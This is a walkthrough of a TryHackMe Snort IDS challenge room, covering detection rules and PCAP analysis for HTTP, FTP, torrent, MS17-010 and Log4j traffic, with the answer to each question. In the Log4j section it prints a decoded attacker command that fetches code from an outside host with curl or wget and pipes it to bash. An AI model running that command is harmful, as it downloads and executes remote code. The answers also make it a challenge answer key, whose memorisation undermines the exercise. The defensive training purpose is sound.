# Snort Challenges 1 - TryHackMe Walkthrough

**Challenge:** [TryHackMe - Snort Challenges 1](https://tryhackme.com/room/snortchallenges1)

---

## Task 1: Introduction

The Snort Challenges 1 room is designed to test and enhance your practical skills with the Snort Intrusion Detection System (IDS). This room builds upon the foundational knowledge from the introductory Snort room and focuses on hands-on application of IDS rule creation, network traffic analysis, and threat detection.

Throughout this challenge, you'll work with various network protocols including HTTP, FTP, and analyze real-world threats such as MS17-010 and Log4j vulnerabilities. The room emphasizes practical skills in writing custom Snort rules, troubleshooting syntax errors, and performing forensic analysis on captured network traffic.

Each task involves analyzing PCAP files with custom Snort rules and extracting specific information from the generated logs, simulating real-world network security monitoring scenarios.

---

## Task 2: HTTP Traffic Analysis

### Question 1
**Q: Write a rule to detect all TCP packets from or to port 80. What is the number of detected packets?**

First, navigate to the local rules file:
```bash
/etc/snort/rules/local.rules
```

Create a bidirectional rule to detect TCP traffic on port 80:
```bash
alert tcp any 80 <> any any (msg: "HTTP Traffic Detected"; sid:100002; rev:1;)
```

Apply the rule to the PCAP file:
```bash
snort -c /etc/snort/rules/local.rules -A full -l . -r mx-3.pcap
```

Read the log file to count detected packets:
```bash
sudo snort -r snort.log
```

**Answer: 164**

### Question 2
**Q: What is the destination address of packet 63?**

Limit the log output to 63 packets:
```bash
sudo snort -r snort.log -n 63
```

Analyze the 63rd packet in the output.

**Answer: 216.239.59.99**

### Question 3
**Q: What is the ACK number of packet 64?**

Limit the log output to 64 packets:
```bash
sudo snort -r snort.log -n 64
```

Locate the 64th packet and identify the ACK number.

**Answer: 0x2E6B5384**

### Question 4
**Q: What is the SEQ number of packet 62?**

Limit the log output to 62 packets:
```bash
sudo snort -r snort.log -n 62
```

Locate the 62nd packet and identify the sequence number.

**Answer: 0x36C21E28**

### Question 5
**Q: What is the TTL of packet 65?**

Limit the log output to 65 packets:
```bash
sudo snort -r snort.log -n 65
```

Locate the 65th packet and identify the TTL value.

**Answer: 128**

### Question 6
**Q: What is the source IP of packet 65?**

From the same 65th packet analysis above.

**Answer: 145.254.160.237**

### Question 7
**Q: What is the source port of packet 65?**

From the same 65th packet analysis above.

**Answer: 3372**

---

## Task 3: FTP Traffic Analysis

### Question 1
**Q: Write a single rule to detect "all TCP port 21" traffic in the given pcap. What is the number of detected packets?**

Navigate to task folder:
```bash
~/Desktop/Exercise-Files/TASK-3 (FTP)
```

Create rule in local.rules file:
```bash
alert tcp any any <> any 21 (msg: "FTP Traffic Detected"; sid:100001; rev:1;)
```

Apply rule to PCAP:
```bash
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
```

Read the log file:
```bash
sudo snort -r snort.log
```

**Answer: 307**

### Question 2
**Q: What is the FTP service name?**

Search for FTP service information in the log:
```bash
grep -i -a "FTP" snort.log
```

**Answer: Microsoft FTP Service**

### Question 3
**Q: Write a rule to detect failed FTP login attempts in the given pcap. What is the number of detected packets?**

Research FTP error codes - "530 User" indicates failed login attempts.

Create new rule:
```bash
alert tcp any any <> any any (msg:"Failed FTP Login"; content:"530 User", nocase; sid:1000001; rev:1;)
```

Apply rule and analyze logs:
```bash
snort -c local.rules -l . -A full -r ftp-png-gif.pcap
snort -r snort.log
```

**Answer: 41**

### Question 4
**Q: Write a rule to detect successful FTP logins in the given pcap. What is the number of detected packets?**

"230 User" indicates successful FTP login.

Modified rule:
```bash
alert tcp any any <> any any (msg:"Successful FTP Login"; content:"230 User", nocase; sid:1000001; rev:1;)
```

Apply rule and analyze logs.

**Answer: 1**

### Question 5
**Q: Write a rule to detect FTP login attempts with a valid username but no password entered yet. What is the number of detected packets?**

"331 Password" indicates valid username provided.

Create rule:
```bash
alert tcp any any <> any any (msg:"Valid Username"; content:"331 Password", nocase; sid:1000001; rev:1;)
```

Apply rule and analyze logs.

**Answer: 42**

### Question 6
**Q: Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet. What is the number of detected packets?**

Combine content filters for both "331 Password" and "Administrator":
```bash
alert tcp any any <> any any (msg:"Administrator Login Attempt"; content:"331 Password", nocase; content:"Administrator", nocase; sid:1000001; rev:1;)
```

Apply rule and analyze logs.

**Answer: 7**

---

## Task 4: PNG and GIF Analysis

### Question 1
**Q: Write a rule to detect the PNG file in the given pcap. Investigate the logs and identify the software name embedded in the packet.**

PNG file signature: `89 50 4E 47 0D 0A 1A 0A`

Create rule:
```bash
alert tcp any any <> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000001; rev:1;)
```

Apply rule and convert log to strings:
```bash
sudo strings snort.log
```

**Answer: Adobe ImageReadyq**

### Question 2
**Q: Write a rule to detect the GIF file in the given pcap. Investigate the logs and identify the image format embedded in the packet.**

GIF file signature: `47 49 46`

Create rule:
```bash
alert tcp any any <> any any (msg:"GIF File Detected"; content:"|47 49 46|"; sid:1000001; rev:1;)
```

Apply rule and analyze strings output.

**Answer: GIF89a**

---

## Task 5: Torrent Metafile

### Question 1
**Q: Write a rule to detect the torrent metafile in the given pcap. What is the number of detected packets?**

Create rule to detect .torrent files:
```bash
alert tcp any any <> any any (msg:"Torrent File Detected"; content:".torrent"; sid:1000001; rev:1;)
```

Apply rule:
```bash
snort -c local.rules -l . -A full -r torrent.pcap
snort -r snort.log
```

**Answer: 2**

### Question 2
**Q: What is the name of the torrent application?**

Convert log to strings and analyze content:
```bash
strings snort.log
```

**Answer: bittorrent**

### Question 3
**Q: What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?**

From the strings analysis of the log file.

**Answer: application/x-bittorrent**

### Question 4
**Q: What is the hostname of the torrent metafile?**

From the strings analysis of the log file.

**Answer: tracker2.torrentbox.com**

---

## Task 6: Troubleshooting Rules

### Question 1
**Q: Fix the syntax error in local-1.rules file and make it work smoothly. What is the number of detected packets?**

**Original rule:**
```bash
alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

**Issue:** Missing space between port and message parameter.

**Fixed rule:**
```bash
alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

Test with:
```bash
sudo snort -c local-1.rules -r mx-1.pcap -A console
```

**Answer: 16**

### Question 2
**Q: Fix the syntax error in local-2.rules file and make it work smoothly. What is the number of detected packets?**

**Original rule:**
```bash
alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
```

**Issue:** Missing source port specification.

**Fixed rule:**
```bash
alert icmp any any -> any any (msg:"Troubleshooting 2"; sid:1000001; rev:1;)
```

**Answer: 68**

### Question 3
**Q: Fix the syntax error in local-3.rules file and make it work smoothly. What is the number of detected packets?**

**Issue:** Both rules had the same SID (1000001), causing a conflict.

**Fix:** Change second rule SID from 1000001 to 1000002.

**Answer: 87**

### Question 4
**Q: Fix the syntax error in local-4.rules file and make it work smoothly. What is the number of detected packets?**

**Issues:** 
- Conflicting SIDs
- Colon used instead of semicolon in message parameter

**Fix:** Change SID and correct punctuation.

**Answer: 90**

### Question 5
**Q: Fix the syntax error in local-5.rules file and make it work smoothly. What is the number of detected packets?**

**Issues:**
- Illegal direction specifier `<-`
- Semicolon used instead of colon in SID parameter
- Missing semicolons

**Fix:** Change `<-` to `->` and correct all punctuation.

**Answer: 155**

### Question 6
**Q: Fix the logical error in local-6.rules file and make it work smoothly to create alerts. What is the number of detected packets?**

**Issue:** Missing `nocase` option for content matching.

**Fixed rule:**
```bash
alert tcp any any <> any 80 (msg: "GET Request Found"; content:"|67 65 74|", nocase; sid: 100001; rev:1;)
```

**Answer: 2**

### Question 7
**Q: Fix the logical error in local-7.rules file and make it work smoothly to create alerts. What is the name of the required option?**

**Issue:** Missing mandatory `msg` parameter.

**Answer: msg**

---

## Task 7: Using External Rules (MS17-010)

### Question 1
**Q: Use the given rule file (local.rules) to investigate the ms17-010 exploitation. What is the number of detected packets?**

Apply external rules to MS17-010 PCAP:
```bash
snort -c local.rules -l . -A full -r ms-17-010.pcap
sudo snort -r snort.log
```

**Answer: 25154**

### Question 2
**Q: Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets?**

Create rule to detect SMB IPC$ access:
```bash
alert tcp any any <> any any (msg:"SMB IPC$ Access"; content:"\\IPC$"; sid:1000001; rev:1;)
```

Apply rule:
```bash
snort -c local-1.rules -l . -A full -r ms-17-010.pcap
```

**Answer: 12**

### Question 3
**Q: What is the requested path?**

Analyze log file for IPC$ related content:
```bash
sudo strings snort.log | grep -a -i "IPC"
```

**Answer: \\192.168.116.138\IPC$**

### Question 4
**Q: What is the CVSS v2 score of the MS17-010 vulnerability?**

Research MS17-010 vulnerability in CVE databases.

**Answer: 9.3**

---

## Task 8: Using External Rules (Log4j)

### Question 1
**Q: Use the given rule file (local.rules) to investigate the log4j exploitation. What is the number of detected packets?**

Apply external rules to Log4j PCAP:
```bash
snort -c local.rules -l . -A full -r log4j.pcap
```

**Answer: 26**

### Question 2
**Q: How many rules were triggered?**

Analyze the alert output to count unique rule triggers.

**Answer: 4**

### Question 3
**Q: What are the first six digits of the triggered rule sids?**

Examine the rule SIDs in the alerts.

**Answer: 210037**

### Question 4
**Q: Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes. What is the number of detected packets?**

Create rule using `dsize` parameter:
```bash
alert tcp any any <> any any (msg:"Payload Size 770-855"; dsize:770<>855; sid:1000001; rev:1;)
```

**Answer: 41**

### Question 5
**Q: What is the name of the used encoding algorithm?**

Analyze log file using strings:
```bash
sudo strings snort.log
```

**Answer: base64**

### Question 6
**Q: What is the IP ID of the corresponding packet?**

Examine packet details:
```bash
snort -r snort.log -X -n 40
```

Find the 40th packet's IP ID.

**Answer: 62808**

### Question 7
**Q: Decode the encoded command. What is the attacker's command?**

**Encoded payload found:**
```
KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
```

Decode using Base64 decoder.

**Answer: (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash**

### Question 8
**Q: What is the CVSS v2 score of the Log4j vulnerability?**

Research Log4j vulnerability (CVE-2021-44228) in vulnerability databases.

**Answer: 9.3**

---

## Task 9: Conclusion

Congratulations! You have successfully completed the Snort Challenges 1 room. This walkthrough demonstrated practical application of Snort IDS rules for detecting various network protocols, analyzing malicious traffic, and performing forensic investigation on captured network data.

### Key Skills Developed

- **Custom Snort Rule Creation**: Writing effective detection rules with proper syntax
- **Network Protocol Analysis**: Deep understanding of HTTP, FTP, and SMB traffic patterns
- **File Signature Detection**: Identifying file types through hex signatures
- **Real-World Threat Investigation**: Analyzing MS17-010 and Log4j exploits
- **Log Analysis and Forensics**: Extracting meaningful information from network captures
- **Troubleshooting**: Debugging rule syntax and logical errors

### Important Snort Rule Components

- **Rule Headers**: `alert`, `log`, `pass` actions with protocol specifications
- **Direction Operators**: `->` (unidirectional), `<>` (bidirectional)
- **Content Matching**: Using `content` keyword with hex values `|XX XX XX|`
- **Message Parameters**: Descriptive alerts with `msg` keyword
- **Rule Identifiers**: Unique `sid` and `rev` values
- **Size Detection**: Using `dsize` for payload length analysis

### Network Security Insights

This challenge highlighted the importance of:
- Proper IDS rule management and testing
- Understanding protocol-specific attack vectors
- Recognizing common exploit patterns
- Maintaining updated rule sets for emerging threats
- Balancing detection sensitivity with false positive rates

The skills gained from this challenge are directly applicable to real-world network security monitoring, incident response, and threat hunting activities.
